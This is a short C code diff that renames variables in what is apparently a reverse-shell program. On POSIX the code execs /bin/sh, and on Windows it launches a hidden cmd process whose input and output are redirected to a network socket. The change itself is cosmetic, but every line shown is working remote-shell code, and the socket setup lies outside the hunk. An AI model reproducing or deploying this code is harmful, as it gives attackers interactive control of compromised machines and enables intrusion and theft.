@@ -73,15 +73,15 @@ int main(void) {
 	char * const argv[] = {"/bin/sh", NULL};
 	execve("/bin/sh", argv, NULL);
 #else
-	STARTUPINFO si;
-	memset(&si, 0, sizeof(si));
-	si.cb = sizeof(si);
-	si.dwFlags = (STARTF_USESTDHANDLES);
-	si.hStdInput = (HANDLE)sockt;
-	si.hStdOutput = (HANDLE)sockt;
-	si.hStdError = (HANDLE)sockt;
-	PROCESS_INFORMATION pi;
-	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+	STARTUPINFO sinfo;
+	memset(&sinfo, 0, sizeof(sinfo));
+	sinfo.cb = sizeof(sinfo);
+	sinfo.dwFlags = (STARTF_USESTDHANDLES);
+	sinfo.hStdInput = (HANDLE)sockt;
+	sinfo.hStdOutput = (HANDLE)sockt;
+	sinfo.hStdError = (HANDLE)sockt;
+	PROCESS_INFORMATION pinfo;
+	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
 #endif
 
 	return (0);
